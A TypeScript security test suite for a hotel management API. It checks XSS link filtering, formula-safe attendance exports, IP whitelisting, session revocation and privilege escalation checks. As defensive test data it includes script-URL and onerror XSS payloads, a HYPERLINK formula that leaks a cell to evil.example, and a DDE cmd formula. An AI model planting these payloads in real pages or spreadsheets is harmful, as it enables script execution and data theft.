/**
 * QA Phase 8 (security, sec1): stored-XSS link sinks, spreadsheet formula injection in the
 * attendance export, the platform IP whitelist on every platform route, sessions after a
 * staff password reset, and the two-step ticket vs access token separation.
 * (Auth sweep, IDOR, CORS, headers, uploads, SSRF, webhooks, rate limits: Phase 6.)
 */
import ExcelJS from "exceljs";
import { afterAll, afterEach, beforeAll, describe, expect, it } from "vitest";
import { createHotel, startServer, type Hotel } from "../integration/helpers";
import { addUser, createPlatformAdmin, db, PASSWORD, req, signIn } from "./kit-auth";

let srv: Awaited<ReturnType<typeof startServer>>;
let h: Hotel;

beforeAll(async () => {
  srv = await startServer();
  h = await createHotel("Sec1");
});
afterAll(() => srv.close());

// Links that run script when clicked (React 18 renders javascript: hrefs as-is).
const SCRIPT_LINKS = ["javascript:alert(document.domain)", "javascript://res.cloudinary.com/%0aalert(1)", "JaVaScRiPt:/uploads/files/x.jpg", "data:text/html,<script>alert(1)</script>"];

describe("stored XSS through links staff can save (sec1-1, sec1-2)", () => {
  it("clock-in selfie: only an http(s) link to our own upload is accepted", async () => {
    const bcrypt = await import("bcryptjs");
    await db.user.update({ where: { id: h.users.cashier.id }, data: { pinHash: await bcrypt.hash("4321", 4) } });
    const cashier = await signIn(srv.base, h.users.cashier.email, h.outletId);
    for (const selfieUrl of SCRIPT_LINKS) {
      await db.staffAttendance.deleteMany({ where: { userId: h.users.cashier.id } });
      const r = await cashier.call("POST", "/attendance/clock-in", { outletId: h.outletId, pin: "4321", latitude: 13.0, longitude: 80.2, accuracy: 10, selfieUrl });
      expect(r.status, `${selfieUrl} → ${JSON.stringify(r.body)}`).toBe(400);
    }
    await db.staffAttendance.deleteMany({ where: { userId: h.users.cashier.id } });
    const ok = await cashier.call("POST", "/attendance/clock-in", { outletId: h.outletId, pin: "4321", latitude: 13.0, longitude: 80.2, accuracy: 10, selfieUrl: `${srv.base}/uploads/files/abc-123.jpg` });
    expect(ok.status, JSON.stringify(ok.body)).toBe(201);
    await db.staffAttendance.deleteMany({ where: { userId: h.users.cashier.id } });
  });

  it("purchase invoice image: script / data links are refused on create and edit; http(s) links are kept", async () => {
    const owner = await signIn(srv.base, h.users.owner.email, h.outletId);
    const item = (await owner.call("POST", "/inventory/items", { name: `Rice ${Date.now()}`, unit: "KG", costPerUnit: 5000 })).body as { id: string };
    const vendor = (await owner.call("POST", "/inventory/vendors", { name: `Vendor ${Date.now()}` })).body as { id: string };
    const body = (invoiceImageUrl: string) => ({ vendorId: vendor.id, items: [{ inventoryItemId: item.id, quantity: 1, unitCost: 100 }], invoiceImageUrl });
    for (const url of SCRIPT_LINKS) expect((await owner.call("POST", "/inventory/purchases", body(url))).status, url).toBe(400);
    const p = await owner.call("POST", "/inventory/purchases", body("https://res.cloudinary.com/demo/invoice.jpg"));
    expect(p.status, JSON.stringify(p.body)).toBe(201);
    expect((await owner.call("PATCH", `/inventory/purchases/${p.body.id}`, { invoiceImageUrl: SCRIPT_LINKS[0] })).status).toBe(400);
    expect((await owner.call("PATCH", `/inventory/purchases/${p.body.id}`, { invoiceImageUrl: "" })).status).toBe(200);
  });

  it("text payloads come back verbatim as JSON (escaped by React on screen), never as HTML", async () => {
    const owner = await signIn(srv.base, h.users.owner.email, h.outletId);
    const name = `<img src=x onerror=alert(1)><svg onload=alert(2)> ${Date.now()}`;
    const r = await owner.call("POST", "/inventory/vendors", { name });
    expect(r.status).toBe(201);
    expect(r.headers.get("content-type")).toMatch(/application\/json/);
    expect(r.headers.get("x-content-type-options")).toBe("nosniff");
    expect(r.body.name).toBe(name);
  });
});

describe("attendance export is formula-safe (sec1-3)", () => {
  it("names and notes starting with = + - @ are written as text", async () => {
    const evil = `=HYPERLINK("https://evil.example/?x="&A1,"Click")`;
    await db.user.update({ where: { id: h.users.kitchen.id }, data: { name: evil } });
    const today = new Intl.DateTimeFormat("en-CA", { timeZone: "Asia/Kolkata" }).format(new Date());
    await db.staffAttendance.create({
      data: { userId: h.users.kitchen.id, outletId: h.outletId, workDate: today, clockInAt: new Date(), clockInDistance: 0, source: "MANUAL", note: "+cmd|' /C calc'!A0" },
    });
    const manager = await signIn(srv.base, h.users.manager.email, h.outletId);
    const csv = await manager.call("GET", `/attendance/export?from=${today}&to=${today}&format=csv`);
    expect(csv.status).toBe(200);
    expect(String(csv.body)).toContain(`'=HYPERLINK`);
    expect(String(csv.body)).toContain(`'+cmd`);
    const xlsx = await fetch(`${srv.base}/attendance/export?from=${today}&to=${today}`, { headers: { authorization: `Bearer ${manager.token}`, "x-outlet-id": h.outletId } });
    const wb = new ExcelJS.Workbook();
    await wb.xlsx.load(Buffer.from(await xlsx.arrayBuffer()) as never);
    const cells = (wb.worksheets[0]!.getSheetValues() as unknown[][]).flat().filter((v) => typeof v === "string") as string[];
    expect(cells.some((c) => c.startsWith("="))).toBe(false);
    expect(cells).toContain(`'${evil}`);
  });
});

describe("platform IP whitelist covers every platform route (sec1-4)", () => {
  const KEY = { scope: "GLOBAL", key: "security.ipWhitelist" };
  afterEach(async () => {
    await db.setting.deleteMany({ where: KEY });
  });

  it("/platform and support views are refused from an IP outside the list; allowed from inside it", async () => {
    const a = await createPlatformAdmin();
    const login = await req(srv.base, "POST", "/auth/login", { body: { email: a.email, password: PASSWORD } });
    const token = login.body.accessToken as string;
    await db.setting.create({ data: { ...KEY, value: ["10.250.1.1"] } });
    const as = (ip: string, path: string, headers: Record<string, string> = {}) => req(srv.base, "GET", path, { ip, headers: { authorization: `Bearer ${token}`, ...headers } });
    expect((await as("10.250.1.1", "/platform/businesses")).status).toBe(200);
    const out = await as("10.99.99.99", "/platform/businesses");
    expect(out.status).toBe(403);
    expect(out.body.error).toMatch(/not allowed from/);
    expect((await as("10.99.99.99", "/admin/settings")).status).toBe(403);
    // A support view is platform access too.
    expect((await as("10.99.99.99", "/orders", { "x-support-business": h.businessId, "x-outlet-id": h.outletId })).status).toBe(403);
    // Hotel staff are never affected by the platform list.
    const cashier = await signIn(srv.base, h.users.cashier.email, h.outletId);
    expect((await cashier.call("GET", "/orders")).status).toBe(200);
  });
});

describe("sessions after a password is set for someone (sec1-5)", () => {
  it("a manager setting a cashier's new password signs the cashier out everywhere", async () => {
    const cashier = await signIn(srv.base, h.users.cashier.email, h.outletId);
    expect((await cashier.call("GET", "/auth/me")).status).toBe(200);
    const manager = await signIn(srv.base, h.users.manager.email, h.outletId);
    try {
      const r = await manager.call("PATCH", `/staff/${h.users.cashier.id}`, { password: "Fresh@Pass2026!" });
      expect(r.status, JSON.stringify(r.body)).toBe(200);
      expect((await cashier.call("GET", "/auth/me")).status).toBe(401);
      expect((await req(srv.base, "POST", "/auth/refresh", { body: { refreshToken: cashier.refreshToken } })).status).toBe(401);
    } finally {
      await db.user.update({ where: { id: h.users.cashier.id }, data: { passwordHash: (await import("bcryptjs")).hashSync(PASSWORD, 4) } });
    }
  });

  it("your own password can't be changed through /staff without the current one (stolen-token takeover)", async () => {
    const manager = await signIn(srv.base, h.users.manager.email, h.outletId);
    try {
      const r = await manager.call("PATCH", `/staff/${h.users.manager.id}`, { password: "Hijack@Pass2026!" });
      expect(r.status).toBe(400);
      expect(r.body.error).toMatch(/Account/);
      // Name / PIN self-edits still work.
      expect((await manager.call("PATCH", `/staff/${h.users.manager.id}`, { name: "Manager Renamed" })).status).toBe(200);
    } finally {
      await db.user.update({ where: { id: h.users.manager.id }, data: { passwordHash: (await import("bcryptjs")).hashSync(PASSWORD, 4) } });
    }
  });
});

describe("two-step login tokens can't stand in for each other", () => {
  it("an access token is not a two-step ticket and a ticket is not an access token", async () => {
    const cashier = await signIn(srv.base, h.users.inventory.email, h.outletId);
    const asTicket = await req(srv.base, "POST", "/auth/2fa/verify", { body: { mfaToken: cashier.token, code: "123456" } });
    expect(asTicket.status).toBe(401);
    const { signMfaTicket } = await import("../../src/services/two-factor");
    const ticket = signMfaTicket({ id: h.users.inventory.id, tokenVersion: 0 });
    expect((await req(srv.base, "GET", "/auth/me", { headers: { authorization: `Bearer ${ticket}` } })).status).toBe(401);
  });
});

describe("privilege escalation paths", () => {
  it("a manager can't edit the owner, grant support access or build a custom role above its base", async () => {
    const manager = await signIn(srv.base, h.users.manager.email, h.outletId);
    // The owner isn't staff of the manager's outlet: hidden (404) or refused (403), never changed.
    expect([403, 404]).toContain((await manager.call("PATCH", `/staff/${h.users.owner.id}`, { name: "Pwned" })).status);
    expect([403, 404]).toContain((await manager.call("PATCH", `/staff/${h.users.owner.id}`, { password: "Pwned@Pass2026!" })).status);
    await db.userOutlet.create({ data: { userId: h.users.owner.id, outletId: h.outletId } }).catch(() => undefined);
    expect((await manager.call("PATCH", `/staff/${h.users.owner.id}`, { password: "Pwned@Pass2026!" })).status).toBe(403);
    await db.userOutlet.deleteMany({ where: { userId: h.users.owner.id } });
    expect((await manager.call("POST", "/support-access", { hours: 24 })).status).toBe(403);
    expect((await manager.call("POST", "/staff/roles", { name: "Super cashier", baseRole: "CASHIER", permissions: ["order:create"] })).status).toBe(403);
    const owner = await signIn(srv.base, h.users.owner.email, h.outletId);
    const above = await owner.call("POST", "/staff/roles", { name: `Cashier+ ${Date.now()}`, baseRole: "CASHIER", permissions: ["order:create", "staff:manage", "outlet:manage"] });
    expect(above.status).toBe(400);
  });

  it("platform support (and the super admin) reach no hotel data through integrations, theatre, channels or storefront", async () => {
    const support = await signIn(srv.base, (await addUser(null, "PLATFORM_SUPPORT")).email);
    const a = await createPlatformAdmin();
    const admin = await signIn(srv.base, a.email);
    for (const c of [support, admin]) {
      for (const path of ["/integrations", "/integrations/whatsapp/templates", "/theatre/screens", "/channels/connection", "/channels/board", "/storefront/settings", "/canteen/slots", "/support-access"]) {
        const r = await c.call("GET", path, undefined, { "x-outlet-id": h.outletId, "x-business-id": h.businessId });
        expect([401, 403], `${path} → ${r.status}`).toContain(r.status);
      }
    }
    // Support can read the platform console but not change it.
    expect((await support.call("GET", "/platform/businesses")).status).toBe(200);
    expect((await support.call("POST", "/platform/businesses", { name: "X" })).status).toBe(403);
  });
});
